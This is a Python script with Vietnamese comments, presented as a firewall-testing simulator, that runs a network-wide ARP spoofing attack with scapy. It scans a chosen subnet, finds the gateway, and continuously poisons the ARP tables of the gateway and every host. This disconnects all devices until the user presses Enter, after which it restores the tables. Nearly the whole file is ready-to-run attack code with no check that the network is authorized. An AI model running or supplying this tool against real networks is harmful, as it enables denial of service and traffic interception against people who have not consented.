#!/usr/bin/env python3
"""
ARP Spoofing toàn mạng - Công cụ giả lập tấn công để kiểm tra firewall.
Sử dụng: sudo python3 network_control.py
"""

import sys
import time
import threading
import argparse
import scapy.all as scapy
from scapy.layers.l2 import ARP, Ether
import ipaddress
import subprocess
import re

# Biến toàn cục điều khiển luồng tấn công
stop_attack = threading.Event()

def get_local_ip():
    """Lấy địa chỉ IP của interface mặc định."""
    try:
        # Lấy interface mặc định (có route 0.0.0.0)
        route = scapy.conf.route.route("0.0.0.0")[0]
        return scapy.get_if_addr(route)
    except:
        # Dự phòng nếu scapy không có route, dùng socket
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip

def get_mac(ip):
    """Lấy địa chỉ MAC của một IP bằng ARP request."""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request
    answered = scapy.srp(packet, timeout=1, verbose=False)[0]
    if answered:
        return answered[0][1].hwsrc
    return None

def scan_network(network_cidr):
    """Quét dải mạng và trả về danh sách {'ip': ..., 'mac': ...}."""
    print(f"[*] Đang quét mạng {network_cidr} ...")
    arp_request = ARP(pdst=network_cidr)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request
    answered = scapy.srp(packet, timeout=2, verbose=False)[0]
    
    devices = []
    for sent, received in answered:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})
    return devices

def get_gateway_ip():
    """Lấy địa chỉ IP gateway mặc định."""
    try:
        return scapy.conf.route.route("0.0.0.0")[2]
    except:
        # Dự phòng parse từ 'ip route'
        out = subprocess.check_output("ip route | grep default", shell=True).decode()
        gw = re.search(r'default via (\S+)', out).group(1)
        return gw

def restore_arp(dest_ip, dest_mac, source_ip, source_mac):
    """Gửi gói ARP đúng để khôi phục bảng ARP."""
    packet = ARP(
        op=2,
        pdst=dest_ip,
        hwdst=dest_mac,
        psrc=source_ip,
        hwsrc=source_mac
    )
    scapy.send(packet, verbose=False, count=5)
    print(f"[+] Khôi phục: {source_ip} là {source_mac} với {dest_ip}")

def spoof(target_ip, target_mac, spoof_ip, attacker_mac):
    """Gửi gói ARP giả mạo liên tục để đầu độc bảng ARP của target."""
    packet = ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
        hwsrc=attacker_mac  # MAC kẻ tấn công giả làm spoof_ip
    )
    while not stop_attack.is_set():
        scapy.send(packet, verbose=False)
        time.sleep(0.5)

def block_network(gateway_ip, devices, attacker_mac):
    """Bắt đầu tấn công ARP spoofing: ngắt kết nối giữa gateway và các host."""
    stop_attack.clear()
    threads = []
    
    # Đầu độc gateway (nói rằng các host có MAC của attacker)
    for device in devices:
        if device['ip'] == gateway_ip:
            continue
        t = threading.Thread(
            target=spoof,
            args=(gateway_ip, get_mac(gateway_ip), device['ip'], attacker_mac)
        )
        t.daemon = True
        t.start()
        threads.append(t)
    
    # Đầu độc từng host (nói rằng gateway có MAC của attacker)
    gw_mac = get_mac(gateway_ip)
    for device in devices:
        if device['ip'] == gateway_ip:
            continue
        t = threading.Thread(
            target=spoof,
            args=(device['ip'], device['mac'], gateway_ip, attacker_mac)
        )
        t.daemon = True
        t.start()
        threads.append(t)
    
    print("[!!!] ĐANG TẤN CÔNG - Tất cả thiết bị trong mạng bị ngắt kết nối. Nhấn Enter để dừng...")
    input()
    stop_attack.set()
    for t in threads:
        t.join(timeout=1)
    
    # Khôi phục bảng ARP sau khi dừng
    print("[*] Đang khôi phục kết nối...")
    gw_mac = get_mac(gateway_ip)
    for device in devices:
        if device['ip'] == gateway_ip:
            continue
        restore_arp(device['ip'], device['mac'], gateway_ip, gw_mac)
        restore_arp(gateway_ip, gw_mac, device['ip'], device['mac'])
    print("[+] Đã khôi phục. Mạng trở lại bình thường.")

def main():
    parser = argparse.ArgumentParser(description="Công cụ giả lập tấn công ARP Spoofing toàn mạng để kiểm tra firewall.")
    parser.add_argument("--subnet", required=True, help="Dải mạng cần quét (vd: 192.168.1.0/24)")
    args = parser.parse_args()
    
    if not args.subnet:
        print("Vui lòng nhập dải mạng!")
        sys.exit(1)
    
    # Xác thực dải mạng hợp lệ
    try:
        network = ipaddress.ip_network(args.subnet, strict=False)
    except ValueError:
        print("[-] Dải mạng không hợp lệ!")
        sys.exit(1)
    
    if os.geteuid() != 0:
        print("[-] Cần chạy với quyền root (sudo).")
        sys.exit(1)
    
    local_ip = get_local_ip()
    local_mac = scapy.get_if_hwaddr(scapy.conf.iface)
    print(f"[*] IP của máy tấn công: {local_ip} - MAC: {local_mac}")
    
    devices = scan_network(args.subnet)
    if not devices:
        print("[-] Không tìm thấy thiết bị nào!")
        sys.exit(1)
    
    print(f"[+] Tìm thấy {len(devices)} thiết bị:")
    for dev in devices:
        print(f"    {dev['ip']} -> {dev['mac']}")
    
    gateway_ip = get_gateway_ip()
    print(f"[*] Gateway phát hiện: {gateway_ip}")
    
    # Lọc ra các host khác gateway
    target_devices = [d for d in devices if d['ip'] != gateway_ip]
    if not target_devices:
        print("[-] Không có host nào để tấn công ngoài gateway.")
        sys.exit(1)
    
    print("\nLựa chọn:")
    print("1 - TẮT (block) tất cả thiết bị (tấn công)")
    print("2 - THOÁT")
    choice = input("Nhập lựa chọn (1/2): ")
    if choice == '1':
        block_network(gateway_ip, target_devices, local_mac)
    else:
        print("Thoát.")

if __name__ == "__main__":
    import os
    main()